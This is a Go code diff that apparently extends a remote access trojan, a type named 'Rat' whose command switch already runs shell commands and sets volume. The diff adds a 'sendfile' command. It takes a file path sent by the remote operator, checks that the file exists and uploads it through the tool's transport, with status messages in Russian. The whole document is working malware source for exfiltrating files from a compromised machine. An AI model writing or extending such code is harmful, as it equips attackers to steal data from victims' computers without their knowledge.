@@ -43,6 +43,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.cmdCmd(args)
 	case "volume":
 		go r.volumeCmd(args)
+	case "sendfile":
+		go r.sendFile(args)
 	case "info":
 		go r.infoCmd()
 	default:
@@ -273,4 +275,24 @@ func (r *Rat) infoCmd() {
 	if err != nil {
 		r.Transport.Send("Ошибка отправки: %v", err)
 	}
+}
+
+func (r *Rat) sendFile(args string) {
+	if args == "" {
+		r.Transport.Send("Пожалуйста, укажите путь к файлу.")
+		return
+	}
+
+	if _, err := os.Stat(args); os.IsNotExist(err) {
+		r.Transport.Send("Файл не найден: %s", args)
+		return
+	}
+
+	err := r.Transport.SendFile(args)
+	if err != nil {
+		r.Transport.Send("Ошибка отправки файла: %v", err)
+		return
+	}
+
+	r.Transport.Send("Файл успешно отправлен: %s", args)
 }
